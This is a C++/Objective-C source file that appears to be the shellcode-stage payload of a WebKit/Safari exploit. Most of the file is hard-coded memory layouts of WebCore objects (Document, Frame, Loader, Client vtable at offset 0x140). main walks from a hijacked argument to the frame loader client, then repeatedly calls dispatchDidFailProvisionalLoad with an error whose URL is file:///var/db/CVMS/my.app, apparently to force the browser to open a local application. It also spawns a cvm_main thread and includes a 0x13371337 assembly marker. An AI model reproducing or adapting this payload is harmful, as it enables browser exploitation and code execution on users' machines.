#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#define WEBCORE_EXPORT
#include "ResourceError.h"
#import <CoreFoundation/CFError.h>
#import <Foundation/Foundation.h>
#include <wtf/URLParser.h>
#import <wtf/BlockObjCExceptions.h>
#import <wtf/NeverDestroyed.h>
#include <sys/stat.h>

namespace WTF {
}

namespace WebCore {
	String getNSURLErrorDomain()
	{
	    static const NeverDestroyed<String> errorDomain(NSURLErrorDomain);
	    return errorDomain.get();
	}
}

class ClientVftable;
using namespace WebCore;

class Client {
public:
	ClientVftable *vftable;
};

class ClientVftable {
	char pad[0x140];
public:
	void (*dispatchDidFailProvisionalLoad)(Client *self, ResourceError &error, bool continueLoading);
};

class Loader {
	char pad[8];
public:
	Client *client;
};

class Frame {
	char pad[0x98];
public:
	Loader *loader;
};

class Document {
	char pad[0x1a0];
public:
	Frame *frame;
};

template<typename T>
class Wrapper {
public:
	void *a, *b, *type;
	T *wrapped;
};

__asm__(".quad 0x13371337, 0\njmp _main");

void *cvm_main(void *);

char base[0x4000] = "file:///var/db/CVMS/";

extern "C"
int main(int, char **args) {
	Document *doc = ((Wrapper<Document> *)args[0])->wrapped;
	Client *client = doc->frame->loader->client;

	pthread_t thread;
	pthread_create(&thread, NULL, cvm_main, NULL);
	pthread_join(thread, NULL);

	char buf[0x400];
	strcpy(buf, (char *)base);
	strcat(buf, "my.app");

	ResourceError error(getNSURLErrorDomain(), -1101, {{}, buf}, "yee");

	while(true) {
		for(int i = 0; i < 1; i++)
			client->vftable->dispatchDidFailProvisionalLoad(client, error, true);
		sleep(8);
	}
}
